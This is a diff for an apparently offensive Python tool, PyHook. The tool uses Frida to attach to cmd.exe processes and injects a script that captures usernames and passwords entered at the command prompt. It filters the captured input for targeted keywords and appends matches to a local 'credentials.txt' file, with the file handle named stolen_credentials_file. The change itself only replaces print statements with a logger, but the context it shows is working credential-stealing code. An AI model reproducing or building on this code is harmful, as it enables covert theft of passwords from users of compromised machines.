@@ -1,16 +1,22 @@
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
 import frida
+
+hook_process_name = "cmd"
+
+
+def logger(message):
+    log(hook_process_name, message)
 
 
 def wait_for():
-    wait_for_process(["cmd.exe"], "CMD", hook)
+    wait_for_process(["cmd.exe"], hook)
 
 
 def hook(pid):
     try:
-        print("[ cmd-hook ] Trying To Attach To CMD")
+        logger("Trying To Hook Into CMD")
         session = frida.attach(pid)
-        print(f"[ cmd-hook ] Attached cmd with pid {pid}!")
+        logger(f"Hooked CMD With PID {pid}")
         script = session.create_script("""
 			var username;
 			var password;
@@ -37,8 +43,8 @@ def hook(pid):
         script.load()
 
     except Exception as e:
-        print("[ cmd-hook ] Unhandled exception: " + str(e))
-        print("[ cmd-hook ] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
 
 
 def on_credential_submit_cmd(message, data):
@@ -47,7 +53,7 @@ def on_credential_submit_cmd(message, data):
     credential_dump = message["payload"]
     if any(keyword for keyword in targeted_keywords if keyword in credential_dump):
 
-        print("[ cmd-hook ] Parsed credentials submitted to cmd prompt:")
+        logger("Parsed credentials submitted to cmd prompt:")
         print(credential_dump)
         with open("credentials.txt", "a") as stolen_credentials_file:
             stolen_credentials_file.write(credential_dump + '\n')
